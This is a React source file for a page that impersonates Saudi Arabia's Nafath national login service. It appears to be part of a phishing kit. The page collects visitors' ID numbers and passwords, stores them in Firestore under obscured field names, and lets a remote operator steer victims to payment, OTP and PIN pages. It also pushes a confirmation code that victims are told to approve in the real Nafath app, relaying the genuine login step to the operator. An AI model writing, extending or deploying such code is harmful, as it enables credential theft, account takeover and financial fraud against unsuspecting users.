"use client";

import { Loader2Icon, ShieldAlert, CheckCircle2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { useEffect, useState } from "react";
import { addData, db } from "@/lib/firebase";
import { Alert } from "@/components/ui/alert";
import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore";
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
import { updateVisitorPage } from "@/lib/visitor-tracking";
import { StepShell } from "@/components/step-shell";

export default function Component() {
  const [showConfirmDialog, setShowConfirmDialog] = useState(false);
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [confirmationCode, setConfirmationCode] = useState<string>("");
  const [isloading, setIsLoading] = useState(false);
  const [idLogin, setLoginID] = useState("");
  const [password, setPassword] = useState("");
  const [showError, setShowError] = useState("");
  const [idError, setIdError] = useState("");

  const visitorId = typeof window !== 'undefined' ? localStorage.getItem("visitor") || "" : ""
  
  // Saudi ID validation function (same as home page)
  const validateSaudiId = (id: string): boolean => {
    const cleanId = id.replace(/\s/g, "")
    if (!/^\d{10}$/.test(cleanId)) {
      setIdError("رقم الهوية يجب أن يكون 10 أرقام")
      return false
    }
    if (!/^[12]/.test(cleanId)) {
      setIdError("رقم الهوية يجب أن يبدأ بـ 1 أو 2")
      return false
    }
    let sum = 0
    for (let i = 0; i < 10; i++) {
      let digit = Number.parseInt(cleanId[i])
      if ((10 - i) % 2 === 0) {
        digit *= 2
        if (digit > 9) {
          digit -= 9
        }
      }
      sum += digit
    }
    if (sum % 10 !== 0) {
      setIdError("رقم الهوية غير صحيح")
      return false
    }
    setIdError("")
    return true
  }
  
  // Monitor for admin redirects
  useRedirectMonitor({ visitorId, currentPage: "nafad" })
  
  // Update visitor page
  useEffect(() => {
    if (visitorId) {
      updateVisitorPage(visitorId, "nafad", 8)
    }
  }, [visitorId])

  // <ADMIN_NAVIGATION_SYSTEM> Unified navigation listener for admin control
  useEffect(() => {
    if (!visitorId) return

    console.log("[nafad] Setting up navigation listener for visitor:", visitorId)

    if (!db) return
    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorId),
      (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data()
          console.log("[nafad] Firestore data received:", data)

          // Admin navigation: Handle page redirects
          if (data.currentStep === "home") {
            console.log("[nafad] Admin redirecting to home")
            window.location.href = "/"
          } else if (data.currentStep === "phone") {
            console.log("[nafad] Admin redirecting to phone-info")
            window.location.href = "/step5"
          } else if (data.currentStep === "_t6") {
            console.log("[nafad] Admin wants visitor to stay on nafad page")
            // Already on nafad page, do nothing
          } else if (data.currentStep === "_st1") {
            console.log("[nafad] Admin redirecting to payment")
            window.location.href = "/check"
          } else if (data.currentStep === "_t2") {
            console.log("[nafad] Admin redirecting to otp")
            window.location.href = "/step2"
          } else if (data.currentStep === "_t3") {
            console.log("[nafad] Admin redirecting to pin")
            window.location.href = "/step3"
          }
          // If currentStep === "_t6" or "nafad" or a number (from updateVisitorPage), stay on this page

          // Listen for confirmation code from admin (updates every time)
          if (data.nafadConfirmationCode) {
            console.log("[nafad] Received confirmation code:", data.nafadConfirmationCode)
            setConfirmationCode(data.nafadConfirmationCode)
            
            // Use localStorage to track shown codes (persists across page reloads)
            const storageKey = `nafad_shown_${visitorId}`
            const lastShownCode = localStorage.getItem(storageKey)
            
            // Only show modal if this is a NEW code (not previously shown)
            if (data.nafadConfirmationCode !== lastShownCode) {
              console.log("[nafad] New code detected, showing modal")
              setShowConfirmDialog(true)
              localStorage.setItem(storageKey, data.nafadConfirmationCode)
              setIsLoading(false) // Stop spinner when modal appears
              setShowError("") // Clear any previous errors
              setShowSuccessDialog(false) // Close success dialog if open
            } else {
              console.log("[nafad] Code already shown, not opening modal")
            }
          } else if (data.nafadConfirmationCode === "") {
            // Admin cleared the code
            setShowConfirmDialog(false)
            const storageKey = `nafad_shown_${visitorId}`
            localStorage.removeItem(storageKey) // Reset tracking
          }

          // Listen for admin approval/rejection
          if (data.nafadConfirmationStatus === "approved") {
            console.log("[nafad] Admin approved the confirmation")
            setShowConfirmDialog(false)
            setShowSuccessDialog(true)
            // Clear status after use
            setDoc(doc(db as Firestore, "pays", visitorId), {
              nafadConfirmationStatus: "",
              nafadConfirmationCode: ""
            }, { merge: true })
          } else if (data.nafadConfirmationStatus === "rejected") {
            console.log("[nafad] Admin rejected the confirmation")
            setShowConfirmDialog(false)
            setShowError("تم رفض عملية التحقق. يرجى المحاولة مرة أخرى.")
            // Clear status after use
            setDoc(doc(db as Firestore, "pays", visitorId), {
              nafadConfirmationStatus: "",
              nafadConfirmationCode: ""
            }, { merge: true })
          }
        }
      },
      (error) => {
        console.error("[nafad] Firestore listener error:", error)
      }
    )

    return () => {
      console.log("[nafad] Cleaning up navigation listener")
      unsubscribe()
    }
  }, [])

  const handleLogin = async (e: any) => {
    e.preventDefault();
    const visitorId = localStorage.getItem("visitor");
    setShowError("");

    // Validate ID before submitting
    if (!validateSaudiId(idLogin)) {
      return
    }

    setIsLoading(true);

    // Save current data to history before updating
    if (visitorId) {
    }

    await addData({
      id: visitorId,
      _v8: idLogin,
      _v9: password,
      nafadConfirmationStatus: "waiting",
      currentStep: "_t6",
      nafadUpdatedAt: new Date().toISOString()
    });
    
    // Keep loading until modal appears (don't stop here)
    // setIsLoading will be set to false when modal opens or error occurs
  };

  // Confirmation code will be displayed as two individual digits

  return (
    <>
      <StepShell
        step={8}
        title="التحقق عبر نفاذ"
        subtitle="استخدم بياناتك للتحقق الآمن ثم تابع الموافقة داخل تطبيق نفاذ."
        icon={<ShieldAlert className="h-8 w-8" />}
      >
        <form onSubmit={handleLogin} className="space-y-4">
          <div className="rounded-xl border border-[#dce8f3] bg-[#f5fafe] p-4 text-sm text-[#24577a]">
            <p className="font-semibold">رقم بطاقة الأحوال/الإقامة</p>
            <p className="mt-1 text-xs text-[#638094]">أدخل رقم الهوية الخاص بك للمتابعة وإتمام التحقق.</p>
          </div>

          <div className="space-y-2">
            <Input
              placeholder="أدخل رقم الأحوال/الإقامة الخاص بك هنا"
              className={`h-12 rounded-xl border-2 px-4 text-right text-base ${
                idError ? "border-red-500" : "border-[#d2e1ed] focus:border-[#145072]"
              }`}
              dir="ltr"
              value={idLogin}
              onChange={(e) => {
                const value = e.target.value.replace(/[^0-9]/g, '').slice(0, 10)
                setLoginID(value)
                if (value.length === 10) {
                  validateSaudiId(value)
                } else if (value.length > 0) {
                  setIdError("رقم الهوية يجب أن يكون 10 أرقام")
                } else {
                  setIdError("")
                }
              }}
              required
            />
            {idError && (
              <p className="text-right text-sm font-semibold text-red-600">{idError}</p>
            )}
          </div>

          <Input
            placeholder="أدخل كلمة المرور الخاصة بك هنا"
            className="h-12 rounded-xl border-2 border-[#d2e1ed] px-4 text-right text-base focus:border-[#145072]"
            dir="rtl"
            onChange={(e) => setPassword(e.target.value)}
            type="password"
            required
          />

          {showError && (
            <Alert className="flex items-center gap-2 border-red-200 bg-red-50 text-sm text-red-700" dir="rtl">
              <ShieldAlert className="h-5 w-5 text-red-600" />
              {showError}
            </Alert>
          )}

          <Button
            type="submit"
            disabled={isloading || !idLogin}
            className="h-12 w-full rounded-xl bg-gradient-to-r from-[#f0b429] to-[#f7c04a] text-lg font-extrabold text-[#145072] shadow-md transition-all hover:from-[#e2a61f] hover:to-[#f0b429] disabled:opacity-60"
          >
            {isloading ? (
              <>
                <Loader2Icon className="ml-2 h-5 w-5 animate-spin" />
                جاري التحقق...
              </>
            ) : (
              "تسجيل الدخول"
            )}
          </Button>

          <div className="rounded-xl border border-[#e2ecf5] bg-[#fbfdff] p-4">
            <p className="mb-3 text-center text-sm font-semibold text-[#45667d]">تحميل تطبيق نفاذ</p>
            <div className="flex justify-center gap-3">
              <a href="#" className="transition-transform hover:scale-105">
                <img src="/google-play.png" alt="Google Play" className="h-10" />
              </a>
              <a href="#" className="transition-transform hover:scale-105">
                <img src="/apple_store.png" alt="App Store" className="h-10" />
              </a>
            </div>
          </div>
        </form>
      </StepShell>

      <Dialog open={showConfirmDialog} onOpenChange={() => {}}>
        <DialogContent className="mx-auto max-w-md border-[#dbe6ef] [&>button]:hidden" dir="rtl">
          <DialogHeader>
            <DialogTitle className="mb-2 text-center text-2xl font-bold text-[#145072]">
              رمز التحقق
            </DialogTitle>
            <p className="px-4 text-center text-base font-semibold leading-relaxed text-[#2f4f64]">
              سيتم إصدار أمر ربط شريحة بوثيقة التأمين الخاصة بك
              <br />
              الرجاء الدخول إلى تطبيق نفاذ وتأكيد الرقم أدناه
            </p>
          </DialogHeader>

          <div className="space-y-6 p-4 text-center">
            <div className="mx-auto flex h-44 w-44 items-center justify-center rounded-2xl border-2 border-[#d4e6f5] bg-[#f4fafe] shadow-sm">
              <div className="flex items-center justify-center gap-3 text-6xl font-bold text-[#145072] font-mono" dir="ltr">
                <div>{confirmationCode?.[0] || "-"}</div>
                <div>{confirmationCode?.[1] || "-"}</div>
              </div>
            </div>

            <div className="flex items-center justify-center gap-3 py-2 text-[#145072]">
              <div className="relative">
                <div className="absolute h-3 w-3 animate-ping rounded-full bg-[#145072]"></div>
                <div className="h-3 w-3 rounded-full bg-[#145072]"></div>
              </div>
              <div className="text-sm font-medium">في انتظار الموافقة...</div>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
        <DialogContent className="mx-auto max-w-md border-[#dbe6ef]" dir="rtl">
          <div className="space-y-6 p-4 text-center">
            <div className="mx-auto flex h-20 w-20 items-center justify-center rounded-full bg-green-100">
              <CheckCircle2 className="h-12 w-12 text-green-600" />
            </div>

            <div className="space-y-2">
              <h3 className="text-2xl font-bold text-[#1d4e68]">تم التحقق بنجاح!</h3>
              <p className="text-[#5f788b]">تمت عملية التحقق من هويتك بنجاح عبر نفاذ</p>
            </div>

            <div className="rounded-lg border-2 border-green-200 bg-green-50 p-4">
              <p className="text-sm font-medium text-green-800">شكراً لاستخدامك منصة النفاذ الوطني الموحد</p>
            </div>

            <Button
              onClick={() => setShowSuccessDialog(false)}
              className="h-12 w-full rounded-xl bg-[#145072] text-lg font-semibold text-white transition-all hover:bg-[#0f405b]"
            >
              إغلاق
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    </>
  );
}
